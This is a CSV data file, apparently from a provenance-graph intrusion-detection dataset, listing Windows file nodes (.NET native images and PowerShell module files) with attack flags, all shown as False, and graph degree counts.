uuid,annotation,node_order,is_attack_node,in_degree_subgraph,out_degree_subgraph,total_degree_subgraph,in_degree_full,out_degree_full,total_degree_full
11b6f1a4-cff5-42bb-b9b2-c5dbf68de86e,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Data\\81e16f376ae576af01d03f568d0eb7c7\\System.Data.ni.dll.aux'},1675,False,10,0,10,10,0,10
320c34bc-7cf6-4786-b0a7-8cce54e0d50d,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Configuration\\5f4650136157b1ab3ef2655cd0808eee\\System.Configuration.ni.dll.aux'},1681,False,10,0,10,10,0,10
10398c9d-3713-495a-ba10-947082300fcf,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.P6f792626#\\e5e6eb1d6846fdcdee4320a83bef1e52\\Microsoft.PowerShell.Security.ni.dll.aux'},1682,False,10,0,10,10,0,10
d7588e36-bd31-4514-a32f-d4234db3e9d5,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Transactions\\ce574ae4e11a47e97df21426503a82c9\\System.Transactions.ni.dll.aux'},1683,False,10,0,10,10,0,10
c2210e52-a397-4bb1-9c3b-6d4265590cc3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\ModuleAnalysisCache'},1688,False,10,0,10,10,0,10
5b712027-eb26-4e03-9328-9a0bc04e4159,{'file': 'C:\\Program Files\\WindowsPowerShell\\Modules\\Microsoft.PowerShell.Operation.Validation\\1.0.1\\Microsoft.PowerShell.Operation.Validation.psd1'},1689,False,10,0,10,10,0,10
e3e3bfa3-ba24-489e-9f17-eeac7a206c9c,{'file': 'C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\\1.0.0.1\\PackageManagement.psd1'},1690,False,10,0,10,10,0,10
d3d60c0a-d229-453c-a516-57db2d2bbae4,{'file': 'C:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\3.4.0\\Pester.psd1'},1691,False,10,0,10,10,0,10
692ae70a-2ffc-44bd-8172-ddaf125b05cb,{'file': 'C:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\3.4.0\\Pester.psm1'},1692,False,10,0,10,10,0,10
c76879c9-c889-4299-b757-a5f5d599abee,{'file': 'C:\\Program Files\\WindowsPowerShell\\Modules\\PowerShellGet\\1.0.0.1\\PowerShellGet.psd1'},1694,False,10,0,10,10,0,10
50d69d43-3545-4dd1-85fd-09e0299ba01d,{'file': 'C:\\Program Files\\WindowsPowerShell\\Modules\\PowerShellGet\\1.0.0.1\\PSModule.psm1'},1695,False,10,0,10,10,0,10
01996f26-6e7b-4296-bdd3-522c043313f5,{'file': 'C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadline.psd1'},1696,False,10,0,10,10,0,10
d65ae5c6-dc31-4b6f-988a-9c0f11fdd5fa,{'file': 'C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psd1'},1697,False,10,0,10,10,0,10
